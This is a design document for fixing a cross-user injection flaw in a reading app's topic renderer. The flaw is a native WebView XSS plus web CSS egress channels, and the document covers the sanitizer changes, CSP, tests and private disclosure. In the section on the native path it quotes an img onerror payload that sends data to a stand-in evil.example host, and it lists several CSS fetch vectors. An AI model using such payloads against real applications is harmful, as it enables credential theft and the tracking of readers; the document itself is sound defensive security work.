# Topic-path sanitizer hardening — design

**Date:** 2026-07-18
**Status:** Approved (brainstorm), pending plan
**Related:** F1 Open Shelves chapter boundary (`docs/superpowers/specs/2026-07-14-imported-book-reading-design.md`),
ADR-027 (draft sharing), the sanitizer module `mobile/src/reader/sanitize.ts`,
the native WebView builders `mobile/src/components/contentHtml.ts`.
**Security:** to be disclosed via a **private GitHub Security Advisory** (precedent: GHSA-48wh-p7cx-c87j).
Do not describe the live vector in a public commit message before the advisory + fix land.

**Base branch — this is a shippable production fix, NOT open-shelves work.** The vulnerability is
**entirely on `main`** and shipped (web app + APK): `SANITIZE_CONFIG` is leaky at `main:sanitize.ts:38-39`
and `htmlDocument` assigns raw `innerHTML` at `main:contentHtml.ts:178`. The fix therefore branches off
**`main`** (e.g. `fix/topic-sanitizer-hardening`) and must be mergeable to `main`. It must **not** depend
on F1's chapter hardening (`makeChapterSanitizeHook`, `CHAPTER_SANITIZE_CONFIG`, `isSafePaintValue`,
`htmlChapterDocument`) — that code lives **only on the localhost-only `feat/open-shelves` branch and is
not on `main`**. See §3.3 (self-contained) and R4 (F1 reconciliation).

## 1. Problem — the topic render path is a live cross-user injection surface

`app/book/shared/[id].tsx` renders **another user's** shared draft (`getSharedDraft().book_json`,
ADR-027, an accepted feature) through `TopicRenderer`, into the app's own document, where
`localStorage` holds the Supabase session and the BYOK LLM key. `TopicRenderer` splits by platform,
and **both branches are exposed**:

### 1a. Native topic path — **Critical (XSS → credential theft)**
`TopicRenderer` (native) → `WebViewTopicRenderer` → `buildTopicHtml` → `htmlDocument`
(`contentHtml.ts:243`, `:183`) does:

```js
document.getElementById('root').innerHTML = DATA.__html;   // NO sanitizer
```

There is **no DOMPurify anywhere on the native topic path**. The inline comment
("the same string the web reader sanitizes") is **false on native** — the web reader is web-only.
`renderTopicToHtml` runs the untrusted `body_markdown` through `md()` = `marked`, which passes raw
HTML through. **Proven by execution** (`buildTopicHtml` is DOM-free; ran it directly): a draft whose
markdown contains

```html
<img src="x" onerror="fetch('https://evil.example/steal?k='+localStorage.length)">
```

is emitted **verbatim** into the string assigned to `innerHTML`. The Android WebView has JavaScript
enabled (KaTeX/Mermaid) and **no CSP** on this document, so the `onerror` fires → arbitrary JS →
reads `localStorage` (BYOK key + Supabase session) → exfiltrates. Android is the primary platform.

Root cause: F1 gave **chapters** an inlined in-WebView DOMPurify (`buildChapterHtml` /
`htmlChapterDocument` / `CHAPTER_SANITIZE_HOOK_JS`). The **topic** native path was overlooked.
The same path also serves the Studio topic screen (own content), so the fix must not regress it.

*Verification caveat:* the payload is proven to **survive into the `innerHTML` assignment**
(code-level execution proof). The final "`onerror` fires in a real Android WebView" is standard
innerHTML-XSS behaviour but was **not** run on a device; `mobile:verify` (~17 min cold build) would
make the advisory airtight.

### 1b. Web topic path — **Moderate (CSS egress + content exfil, no JS)**
`TopicRenderer` (web) → `NativeTopicReader.web` → `renderTopicToSafeHtml` → `sanitizeFragment`
(`SANITIZE_CONFIG`, `sanitize.ts:32`). DOMPurify **does** run here, so `<script>`, `on*` handlers,
and `javascript:` are stripped (no JS execution). But the config is the **pre-F1 unhardened boundary**
for CSS fetch channels: no `style` in `FORBID_TAGS`, no `style`/`srcset` in `FORBID_ATTR`, and **no
`afterSanitizeAttributes` hook**. **Proven by execution** (jsdom probe): **11/12** of F1's
Chromium-proven fetch vectors survive `sanitizeFragment` output and the full `renderTopicToSafeHtml`
path — `<style>@import`, all four `style`-attribute CSS mechanisms (`url()`, `image-set()`, `var()`
indirection, `\75 rl(` escape), `srcset`, SVG paint `url()` (`fill`/`filter`/`mask`), `background=`.
Impact: unauthorized network egress on open (tracking pixel deanonymises the reader) + CSS-selector
content exfiltration. Moderate — no secret theft (CSS cannot read `localStorage`).

## 2. Goals / non-goals

**Goals**
- G1. Native topic WebView must sanitize untrusted HTML **before** it reaches `innerHTML`, closing the
  XSS. Same guarantee chapters already have.
- G2. Web `sanitizeFragment` must close the CSS/style/srcset/SVG-paint fetch channels, matching the
  chapter boundary.
- G3. One shared implementation of the web hardening core so topic and chapter boundaries cannot drift
  (the "parity ≠ coverage" failure mode from F1).
- G4. Zero regression to legitimate topic content: KaTeX, Mermaid, animated-SVG figures, `data:`
  figures, prose, tables, internal `#fragment` anchors.

**Non-goals**
- N1. Not touching the chapter boundary — it isn't on `main`. No chapter code is edited here; the
  primitives are introduced fresh (§3.3). Convergence with F1's copies happens at the F1 merge (R4).
- N2. Not preserving external `<a href>` / external `<img>` on topics — user chose **data:-only
  everything** (external click-links dropped; our own content has zero external links today).
- N3. Not redesigning draft sharing or ADR-027. Not a server-side change.
- N4. Not adding a network allowlist to imported chapters (that boundary is already zero-network).

## 3. Design

### 3.1 Native topic path (G1) — mirror the chapter WebView sanitizer
`buildTopicHtml` currently renders body → `htmlDocument` → raw `innerHTML`. Change `htmlDocument` so
its in-WebView script sanitizes `DATA.__html` with an inlined DOMPurify **before** assignment,
exactly as `htmlChapterDocument` does for chapters:
- Inline `DOMPURIFY_SRC` (already imported in `contentHtml.ts`) in the topic document.
- Sanitize with a **topic** config = the chapter config's shape **plus** the topic's animation
  allowances (`ADD_TAGS: ANIMATION_TAGS`, `ADD_ATTR: ANIMATION_ATTRS`) and the re-authored hook
  (`CHAPTER_SANITIZE_HOOK_JS` core: data:-only URI attrs, `isSafePaintValue` paint allowlist,
  SVG-`data:`-URI recursion, `style`/`srcset` in `FORBID_ATTR`, `style` in `FORBID_TAGS`).
- `root.innerHTML = DOMPurify.sanitize(DATA.__html, CFG)` — never the raw string.
- **CSP** `<meta>` on the topic document as defense-in-depth. Unlike the chapter CSP
  (`default-src 'none'`), topics legitimately load KaTeX/Mermaid/Google-Fonts from CDNs, so the topic
  CSP must permit exactly those hosts and no more:
  `default-src 'none'; img-src data:; style-src 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net; script-src 'unsafe-inline' https://cdn.jsdelivr.net; font-src https://fonts.gstatic.com https://cdn.jsdelivr.net; connect-src 'none'`.
  `connect-src 'none'` + `img-src data:` block the fetch/beacon/tracking-pixel exfil channels even if a
  handler ever fired. **Note the residual:** the document's own IIFE needs `script-src 'unsafe-inline'`,
  so CSP does **not** by itself block an inline `onerror` — the DOMPurify strip (G1) is the primary
  control, CSP is the backstop. *Optional strengthening for the plan/review to weigh:* give the doc's
  IIFE a per-render **nonce** (`randomUUID` from `@/lib/uuid`, Hermes-safe) so `script-src` can drop
  `'unsafe-inline'`, at which point CSP also blocks inline handlers. Keep the CDN `<script src>` under
  the host allowlist.
- The native hook JS is **hand-authored** (Hermes strips function source in release builds — F1's
  reason for the re-authored copy), pinned byte-identical to its web twin by a generated-source /
  parity test, exactly as the chapter copy is.

### 3.2 Web topic path (G2) — harden `SANITIZE_CONFIG` / `sanitizeFragment`
- Add `style` to `FORBID_TAGS`; add `style`, `srcset` to `FORBID_ATTR` (reuse the
  `CHAPTER_HOOKLESS_FORBID_ATTR` intent).
- Attach an `afterSanitizeAttributes` hook to the `sanitizeFragment` pass that runs the **shared core**
  (§3.3): reduce every `URI_ATTRS` attribute to `data:`-only (drop otherwise), screen SVG paint via
  `isSafePaintValue`, recurse into `data:image/svg+xml` payloads with a nested config that also forbids
  `style`/`srcset` (the F1 fix-#4 non-inheritance lesson).
- **Keep** `ADD_TAGS: ANIMATION_TAGS` + `ADD_ATTR: ANIMATION_ATTRS`.
- Difference from the chapter hook: **no image-map resolution** — topics have no chapter `images` map;
  their figures are already `<img src="data:…">` (via `dataUrls` at render), which pass the data:-only
  rule unchanged. `src` gets data:-or-drop like every other URI attr.

### 3.3 Sanitizer primitives (G3) — introduce fresh on `main`, self-contained
On `main` there is **no** chapter hardening to reuse (§Base branch) — `makeChapterSanitizeHook`,
`isSafePaintValue`, `CHAPTER_URI_ATTRS`, `htmlChapterDocument` exist only on `feat/open-shelves`. So
this fix **introduces** the sanitizer primitives on `main`, self-contained:
- **Web** (`sanitize.ts`): a `makeTopicSanitizeHook` (`afterSanitizeAttributes`) + the primitives it
  needs — `isSafePaintValue` (paint allowlist: plain colour/keyword/number or `url(#ident)`, reject
  backslash/unknown-function), a `URI_ATTRS` data:-or-drop list, and a `sanitizeSvgDataUri` recursion
  (with a nested config that also forbids `style`/`srcset` — the F1 non-inheritance lesson, applied
  pre-emptively). No image-map branch (topics have none; `src` is data:-or-drop).
- **Native** (`contentHtml.ts`): a hand-authored `TOPIC_SANITIZE_HOOK_JS` + inlined `DOMPURIFY_SRC`
  in the topic document, pinned byte-identical to the web core by a parity/generated-source test
  (Hermes strips function source — same reason chapters hand-copy).
- These primitives are written so they are **portable to the chapter boundary too** (identical shapes
  to F1's), so the future F1 merge (R4) can converge on them rather than carrying a second copy.

Because these authored primitives mirror F1's exactly (F1 was the reference design), the web-vs-native
hand-copy discipline and the parity test are the same as F1's; only the base branch differs.

### 3.4 Preservation / blast radius (G4) — verified zero-cost for our content
- Our topic renderer (`topicHtml.ts`, `figuresHtml.ts`, `markdown.ts`) emits **no** inline
  `style`/`srcset`/`fill=` (grep-verified).
- KaTeX + Mermaid run **after** sanitize (`enhanceReaderNode` on web; the WebView's guarded
  post-`innerHTML` scripts on native), so dropping `style` never touches their output.
- 43 bundled animated-SVG figures: **0** real inline `style=` (the two apparent hits were
  `font-style="italic"`), **1** `fill="url(#local)"` (preserved by the allowlist), **0** external
  paint refs. Colours / numbers / animation-timing attrs all pass.
- Cost accepted (§N2): external `<a href>`/`<img>` in author-written topics reduced to `data:`-only.

## 4. Testing (F1-grade)

- **Web:** extend the shared vector table against the **topic** path. Every confirmed-leaking vector
  (the 11 from §1b) must DROP through `sanitizeFragment` **and** the full `renderTopicToSafeHtml`
  entry. Keep-vectors survive: animated SVG (`fill="url(#id)"`, animation attrs), `data:` figures,
  headings/prose/tables, `#fragment` anchors, KaTeX/Mermaid placeholders (`.mermaid`, `$…$` left for
  the post-pass). Prove discrimination (pre-fix leaks → post-fix drops).
- **Native:** mirror F1's chapter native test — build the real `buildTopicHtml` document and execute it
  in jsdom (`runScripts:"dangerously"`), read back `#root`, assert the XSS set (`<img onerror>`,
  `<svg onload>`, `javascript:`, the CSS vectors) is gone and legitimate content (incl. a KaTeX `$x$`
  and a `.mermaid` block) survives to the post-pass. Assert the CSP `<meta>` is present and correctly
  scoped (permits jsdelivr + fonts, `connect-src 'none'`).
- **Parity:** a test pinning the native hook JS byte-identical to the shared web core (as the chapter
  copy is pinned).
- **E2E:** a malicious `GeneratedTopic` (payload in a lesson `body_markdown`) through both
  `renderTopicToSafeHtml` and `buildTopicHtml` → `evil.example` absent from both outputs.
- **Regression:** full suite green on `main` + the new tests. (No chapter tests exist on `main`, so
  there is no chapter suite to hold neutral here — that concern moves to the F1 merge, R4.)

## 5. Security review

An F1-grade **adversarial "attack the boundary, not the table"** review is mandatory before this is
called done — the same discipline that found 7 chapter Criticals. Specifically: hunt a channel the
vector table doesn't enumerate; verify the native CSP cannot be the *only* control relied on; confirm
the shared-core extraction did not silently weaken the chapter boundary. Optional: `mobile:verify`
device run confirming the native XSS pre-fix and its closure post-fix.

## 6. Disclosure

Private GHSA advisory (Critical: native XSS + credential theft; Moderate: web CSS egress), drafted for
the user to review and file. The fix lands before public detail. Commit messages until the advisory is
published describe the change as sanitizer hardening without the live exploit string.

## 7. Risks / open questions

- **R1.** Native CSP `script-src 'unsafe-inline'` vs the nonce option (§3.1) — the plan should decide
  whether to adopt the nonce now (stronger, more code) or ship the DOMPurify-primary fix and note the
  nonce as a follow-up. Recommendation: DOMPurify strip is decisive; adopt the nonce only if the
  security review judges the residual meaningful.
- **R2.** *(was: chapter behaviour-neutrality — moot on `main`, no chapter code here.)* Instead: the
  new primitives must mirror F1's shapes closely enough that R4 convergence is a dedupe, not a rewrite.
- **R3.** Verification of the native XSS is code-level, not device-level (§1a caveat) — resolve via
  `mobile:verify` if the advisory needs it.
- **R4. F1 reconciliation (merge-time, not now).** `feat/open-shelves` carries F1's chapter copies of
  these primitives; `main` will now carry the topic copies. When F1 merges to `main` (if ever — it is
  currently localhost-only), the two must converge to one shared web core + one hand-copied native
  twin per boundary, deduping `isSafePaintValue`/`URI_ATTRS`/`sanitizeSvgDataUri`. This is a known,
  deferred cleanup — flag it in the F1 branch's ledger so the eventual merge expects it. It does not
  block this fix.
- **R5. Ordering vs the disclosure.** The fix ships to `main` (public repo) — the advisory should be
  drafted/filed in step with the merge so the exploit is not inferable from a public diff before users
  can update. The Android APK re-release cadence (a manual GitHub Release) means the native fix's
  availability lags the merge; the advisory timeline should account for that.
